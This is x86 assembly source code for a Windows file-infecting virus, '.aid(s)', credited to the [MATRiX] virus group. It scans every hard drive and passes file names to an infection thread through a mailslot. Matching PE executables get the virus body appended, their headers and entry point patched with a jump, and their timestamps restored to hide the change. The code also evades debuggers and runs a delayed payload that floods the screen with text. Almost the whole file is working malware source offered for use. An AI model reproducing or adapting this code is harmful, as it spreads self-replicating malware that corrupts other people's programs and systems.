

.586
.model flat,stdcall

;--------------------------------------------------------------------------
extrn               ExitProcess                   : proc
extrn               MessageBoxA                   : proc
extrn               CreateMailslotA               : proc
extrn               ReadFile                      : proc
extrn               WriteFile                     : proc
extrn               CreateThread                  : proc
extrn               SetThreadPriority             : proc
extrn               ResumeThread                  : proc
extrn               CloseHandle                   : proc
extrn               Sleep                         : proc
extrn               GetLastError                  : proc
extrn               CreateFileA                   : proc
extrn               WaitForSingleObject           : proc
extrn               CreateEventA                  : proc
extrn               SetEvent                      : proc
extrn               CreateFileMappingA            : proc
extrn               MapViewOfFile                 : proc
extrn               GlobalAddAtomA                : proc
extrn               WaitForSingleObject           : proc
extrn               CreateMutexA                  : proc
extrn               ReleaseMutex                  : proc
extrn               FindFirstFileA                : proc
extrn               FindNextFileA                 : proc
extrn               lstrcatA                      : proc
extrn               lstrlenA                      : proc
extrn               lstrcpyA                      : proc
extrn               lstrcmpiA                     : proc
extrn               GetCurrentDirectoryA          : proc
extrn               SetCurrentDirectoryA          : proc
extrn               FindClose                     : proc
extrn               CreateDCA                     : proc
extrn               ReleaseDC                     : proc
extrn               TextOutA                      : proc
extrn               GetSystemMetrics              : proc
extrn               SetBkMode                     : proc
extrn               GetStockObject                : proc
extrn               SelectObject                  : proc
extrn               GlobalAlloc                   : proc
extrn               GlobalFree                    : proc
extrn               SetFileAttributesA            : proc
extrn               SetFileTime                   : proc
extrn               UnmapViewOfFile               : proc
extrn               SetFilePointer                : proc
extrn               SetEndOfFile                  : proc
extrn               GlobalFindAtomA               : proc
extrn               IsDebuggerPresent             : proc


include share.inc

;---( constants )--------------------------------------------------------
_DEBUG              = 0
_maxPath            = 260
_wait               = 0
_XS                 = 0
_YS                 = 1

;---( structures )-------------------------------------------------------

filetime           struc
         FT_dwLowDateTime        dd ?              
         FT_dwHighDateTime       dd ?              
filetime           ends              
fileSearch         struc             
         FileAttributes          dd ?              
         CreationTime            filetime ?        
         LastAccessTime          filetime ?        
         LastWriteTime           filetime ?        
         FileSizeHigh            dd ?              
         FileSizeLow             dd ?              
         Reserved0               dd ?              
         Reserved1               dd ?              
         FileName                db _maxPath dup(?)
         AlternateFileName       db 13 dup(?)     
                                 db 3 dup(?)      
fileSearch          ends             


;--------------------------------------------------------------------------
.data?
_msHNDLr            dd ?                          ;read mailslot handle
_msHNDLw            dd ?                          ;write mailslot handle
_filePath           db _msMessSize dup(?)         ;readed message
_fw                 dd ?                          ;needed dword
_eHNDL              dd ?                          ;event handle
_mutexHNDL          dd ?                          ;mutex handle
_hostBase           dd ?      ;base of infected host
_fmBase             dd ?      ;base of mapped file with client and ps
_newFileSize        dd ?      ;new file size of infected host

;---( @2 data? )---------------------------------------------------------
_name               db _maxPath dup(?)
_nameH              db _maxPath dup(?)
_oldCurrDir         db _maxPath dup(?)
_drives             db _maxPath dup(?)
_fs                 fileSearch <>
_path               db _maxPath dup(?)

;---( @3 data? )---------------------------------------------------------
_seed               dd ?
_x                  dd ?
_y                  dd ?
_hdc                dd ?

;---( data )-------------------------------------------------------------
.data
_title              db '.aid(s) by mort[MATRiX]',0
_msName             db '\\.\mailslot\aiD',0       ;mailslot name
_e                  db 'e',0                      ;event name
_mutex              db 'aid synch mutex',0        ;mutex name
_threads            label                         ;threads' stuff
          dd        offset @1
          dd        offset @2
          dd        offset @3

_fm                 db 'aiD-fm',0       ;mapped data file
_sm1                db '.aiD properlly running',0
;---( @2 data )----------------------------------------------------------
_mask               db '*.*',0
_2d                 db '..',0
;---( @3 data )----------------------------------------------------------
_d                  db 'DISPLAY',0
_m                  db '[MATRiX]',0
_messages           label
          dd offset _mes1
          dd offset _mes2
          dd offset _mes3
          dd offset _mes4
          dd offset _mes5
          dd offset _mes6
          dd offset _mes7
          dd offset _mes8
          dd 0
          
_mes1     db '.aiD by mort[MATRiX] running properly on system...',0
_mes2     db ' freeware version - for educational purpose only',0
_mes3     db ' (c)[MATRiX] group 2000',0
_mes4     db ' [MATRiX] team: ULTRAS, Del_Armg0, NBK, Anaktos, Lord Dark, mort',0
_mes5     db ' greetz: [MATRiX] team, all ppl on undernet #virus chan',0
_mes6     db ' special greetz to Anaktos, Darkman and Perikles',0
_mes7     db ' special bug: well, i dont think it''ll run ever properlly,...:)',0
_mes8     db ' ------[ dedicated moji marene ]-',0
_mess     db ' click OK, and u''ll b ok,...',0

;------------------------------------------------------------------------
.code
@exit:
          call ExitProcess,0
@aid_s:
          push offset _sm1
          call GlobalFindAtomA
          call GetLastError             ;bad mutual exclusion :(((
          or eax,eax
          jz @exit
          
          push offset _sm1              ;set atom mark -> we're here,...:)
          call GlobalAddAtomA

          if _DEBUG
          elseif
          call IsDebuggerPresent        ;woooooo
          dec eax
          jz @exit
          endif
          
          push offset _e                ;create synch. event
          push 0 0 0
          call CreateEventA
          mov [_eHNDL],eax

          push offset _mutex        ;create mutex to synch mailslot access
          push 0 0
          call CreateMutexA

          mov [_mutexHNDL],eax
          
          mov eax,[esp]                 ;initialize random generator
          mov [_seed],eax

          push 0                        ;create mailslot,..
          push -1                       ;wait for first client
          push _msMessSize              ;to get virus body
          push offset _msName
          call CreateMailslotA
          mov [_msHNDLr],eax
          
          push 3                        ;create 3 threads
          mov esi,offset _threads
          
@nextThread:
          push offset _fw
          push 0 0
          lodsd
          push eax
          push 0 0
          call CreateThread

          dec dword ptr [esp]
          jnz @nextThread
   
          push -1                       ;yeeeeeeeeeeee
          call Sleep

;---( map )-------------------------------------------------------------
;ebx - name
;eax - size
;ecx - handle
;---------------> edi -  object handle, eax - map address
@map:
          push eax
          push ebx
          push eax
          push 0 4 0
          push ecx
          call CreateFileMappingA
          push 0 0 2 eax
          xchg edi,eax
          call MapViewOfFile
          ret

;---( reading thread )--------------------------------------------------
@1:
          mov ebx,offset _fm            ;map shared file
          mov eax,_fmSize
          xor ecx,ecx
          dec ecx
          call @map

          mov [_fmBase],eax
          
@nextMessage:                           ;read message from mailslot
          push 0 
          push offset _fw
          push _msMessSize
          push offset _filePath
          push [_msHNDLr]
          call ReadFile
          
          dec dword ptr [esp]
          push offset @nextMessage
          jnz @infect
             
          push [_eHNDL]                 ;start @2 thread
          call SetEvent
          
;---( infect routine )--------------------------------------------------
@infect:
          mov eax,offset _filePath + FileName
          cmp dword ptr [eax],'SOHG'
          jnz @nope

          push eax
          push offset _filePath + _dirAdd
          call lstrcatA          

          push eax            ;well known stuff,...
          
          push 020h
          push eax
          call SetFileAttributesA
          
          pop eax
          push 0 0 3 0 1
          push 080000000h or 040000000h
          push eax
          call CreateFileA

                    
          push eax            ;CloseHandle 
          push eax            ;SetFileTime
          push eax            ;SetEndOfFile
          push eax            ;SetFilePointer
                    
          xchg eax,ecx
          mov eax,dword ptr [offset _filePath + FileSizeLow]
          mov [_newFileSize],eax
          add eax,04000h
          mov ebx,offset _filePath + FileName
          call @map
          
          push edi eax 
          
          call @finalInfection
          
          call UnmapViewOfFile
          call CloseHandle

          pop ebx
          push 0 0
          push [_newFileSize]
          push ebx
          call SetFilePointer
          call SetEndOfFile
                    
          pop ebx
          mov eax,offset _filePath + LastWriteTime
          push eax
          sub eax,8
          push eax
          sub eax,8
          push eax
          push ebx
          call SetFileTime
                    
          call CloseHandle
@nope:                    
          ret


;---( searching thread )------------------------------------------------
@2:
          if _DEBUG
          mov dword ptr [offset _path],'\:H'
          else

          push [_eHNDL]                 ;wait for first running inf.file
          call WaitForSingleObject

          mov dword ptr [offset _path],'\:C'
          
          endif
          
          call @konec
          call ExitProcess,0
@konec:
          push  0          
          
;-----------------------------------------------------------------------
@scan:                                  ;scann 'nearlly' :)) all HDDs
          push offset _oldCurrDir
          push _maxPath
          call GetCurrentDirectoryA
          
          mov edi,offset _path
          push edi          
@newDir:          
          call SetCurrentDirectoryA

          or eax,eax
          jz @allDone
                    
          push offset _fs
          push offset _mask
          call FindFirstFileA
          
          push eax
          
@checkIF:
          pop ebx
          mov eax,[esp]
          or eax,eax
          jz @examine
          
          push ebx
          
          push offset _name
          push offset _fs.FileName
          call lstrcmpiA
          or eax,eax
          pop ebx
          jnz @nextFile

          dec dword ptr [esp]
                   
@nextFile:
          push ebx
          push offset _fs
          push ebx
          call FindNextFileA
          
          dec eax
          jz @checkIF

          call FindClose
          dec eax
                             
          cmp byte ptr [offset _path + 3],0
          jz @driveDone
          
@setPrevDir:          
          push offset _2d
          call SetCurrentDirectoryA

          inc dword ptr [esp]
          
          mov edi,offset _path
          push edi edi        ;_path
          call lstrlenA
          add edi,eax
          xchg eax,ecx
          dec edi
          std
          xor al,al
          stosb
          mov al,'\'
          repne scasb
          inc edi
          push edi
          inc edi
          cld
          push edi
          push offset _name
          call lstrcpyA
          pop edi
          mov word ptr [edi],'\'

          jmp @newDir
          
@examine:          
          cmp byte ptr [offset _fs.FileName],'.'
          jz @nextFile
          mov al,byte ptr [offset _fs.FileAttributes]
          and al,010h
          cmp al,010h
          jnz @sendFile
                              ;new directory founded
          push ebx
          call FindClose
          
          mov edi,offset _path
          push edi
          push offset _fs.FileName
          push edi
          call lstrcatA
          push edi
          call lstrlenA
          
          add eax,[esp] 
          mov word ptr [eax],'\'
          jmp @newDir
          
@sendFile:         
          push ebx
          call FindClose

          push offset _fs.FileName      ;save last searched name
          push offset _name
          call lstrcpyA
          
          push offset _oldCurrDir
          call SetCurrentDirectoryA
          

          mov [esp],eax
          
          ;send file path to mailslot

          push -1             ;wait for mailslot access
          push [_mutexHNDL]
          call WaitForSingleObject
          
          push 0 080h 3 0 1             ;open mailslot
          push 020000h or 2 or 0100h or 010h or 4 or 0100000h
          push offset _msName
          call CreateFileA
          push eax
          
          push 0              ;send file to reading thread,...
          push offset _fw     
          push _msMessSize
          push offset _fs
          push eax
          call WriteFile
          
          call CloseHandle              ;close mailslot
          
          push [_mutexHNDL]
          call ReleaseMutex             ;and release mailslot access
          
          if _DEBUG
          push -1
          call Sleep
          endif
          
          jmp @scan          

@driveDone:
          inc byte ptr [offset _path]
          jmp @scan
          
@allDone:
          cmp byte ptr [offset _path + 3],0
          jnz @setPrevDir

          pop eax
          ret                    

;-----------------------------------------------------------------------
@3:         
          ;payload thread
          
          push (100*60*60)*2  ;wait some time,...
          call Sleep

          push 0 0 0                    ;get screen context
          push offset _d
          call CreateDCA
          mov [_hdc],eax

          push 1                        ;set transparency mode
          push eax
          call SetBkMode

          push 16                       ;set fixet font
          call GetStockObject
          push eax
          push [_hdc]
          call SelectObject
          
          mov [_x],010h
          mov [_y],030h
          
          mov esi,offset _messages

@nextMessageP:                           ;print message
          lodsd
          or eax,eax
          jz @printDone

          xchg eax,edi
          push edi
          call lstrlenA
 
          push eax
          push edi
          push [_y]
          push [_x]
          push [_hdc]
          call TextOutA
          
          add [_y],20
          jmp @nextMessageP
          
@printDone:          

          call MessageBoxA,0,offset _mess,offset _title,0

          push 2              ;play forever
          push [_hdc]
          call SetBkMode
          
;          mov eax,[esp]
 ;         mov [_seed],eax
          
          push _XS
          call GetSystemMetrics          
          mov [_x],eax
          push _YS
          call GetSystemMetrics          
          mov [_y],eax
                    
@loopie:
          push 8
          push offset _m
          push 0 0
          push [_hdc]

          push [_x]
          call @gr
          mov [esp + 8],eax
          
          push [_x]
          call @gr
          mov [esp + 4],eax
          
          call TextOutA

          jmp @loopie
          
;---( get random number )-----------------------------------------------
@gr:
          mov eax,[_seed]
          rol eax,3
          xor eax,[_seed]
          adc [_seed],eax
          mov ebx,eax
          sbb eax,[_seed]
          and eax,0fffffffh
@grl:
          cmp eax,[esp + 4]
          jl @grDone
          sub eax,[esp + 4]
          xor [_seed],eax
          jmp @grl
@grDone:        
          ret 4

;---( final infection )-------------------------------------------------
@finalInfection:
          xchg eax,ebx
          movzx eax,word ptr [ebx]
          not eax
          cmp eax,not 'ZM'
          jnz @noEXE
          
          mov esi,[ebx + 03ch]
          add esi,ebx
          lodsd
          not eax
          cmp eax,not 'EP'
          jnz @noEXE
          
          push dword ptr [esi + 028h]             ;entry point
          push dword ptr [esi + 030h]             ;imagebase
          add dword ptr [esi + 04ch],_vSize0200h  ;imagesize

          mov eax,[esi + 070h]
          shl eax,3
          add eax,esi
          add eax,074h
          
          push eax            ;save code section header
          xchg eax,esi
          xchg eax,edi        ;save PE address

@nextHeader:          
          lodsd
          add esi,024h
          or eax,eax
          jnz @nextHeader
          
_secSub             = 2*028h

          mov eax,[esi + 010h - _secSub]
          add eax,ebx
          add eax,[esi + 014h - _secSub]
          xchg eax,edi
          push edi                      ;save client destination
          mov eax,[_fmBase]
          push eax                      ;save mapped file base
          mov ecx,[eax + _wholeSize]
          add eax,_clientStart
          xchg eax,esi
          rep movsb

          ;eax - last section headet over-pointer
          
          xchg eax,esi
          mov eax,dword ptr [esi + 0ch - _secSub]
          add eax,dword ptr [esi + 010h - _secSub]
          pop edi

          mov ecx,eax                   ;save RVA of virii for jump counting

          add eax,[edi + _clientSize]
          ;eax - real address of packed server
          
          add eax,dword ptr [esp + 08h]
          xchg eax,edx
          
          mov eax,[esp]                 ;set patch1
          add eax,dword ptr [edi + _aiDsAdd1]
          mov [eax],edx
          mov eax,[esp]                 ;set patch2
          add eax,dword ptr [edi + _aiDsAdd2]
          mov [eax],edx
          
          add dword ptr [esi + 08h - _secSub],_vSize01000h
          add dword ptr [esi + 010h - _secSub],_vSize0200h
          or dword ptr [esi + 024h - _secSub],0a0000020h
          
          ;ecx - RVA of virii

          ;[esp] - client destination
          ;[esp + 4] - code section header
          ;[esp + 8] - imagebase
          ;ebx - host base

          mov esi,dword ptr [esp + 4]
          mov eax,dword ptr [esi + 014h]

          mov edx,dword ptr [esp + 0ch]           ;count entrypoint
          sub edx,dword ptr [esi + 0ch]
          add eax,edx

          add eax,ebx                   ;save old bytes
          xchg eax,esi
          mov edi,[esp]
          add edi,_oldBadd
          push esi
          movsd
          movsb

          xchg eax,esi                            ;set return address
          mov eax,dword ptr [esi + 0ch]
          sub ecx,eax
          add eax,dword ptr [esp + 0ch]           ;add image base
          add eax,edx                             ;count entrypoint
          sub edi,4 + _oldBadd
          stosd

          pop edi                       ;set jump
          mov al,0e9h
          stosb
          xchg eax,ecx
          sub eax,5
          stosd

          add esp,010h                            ;clear stack
          add [_newFileSize],_vSize0200h          ;enlarge filesize          
@noEXE:          
          ret

end @aid_s
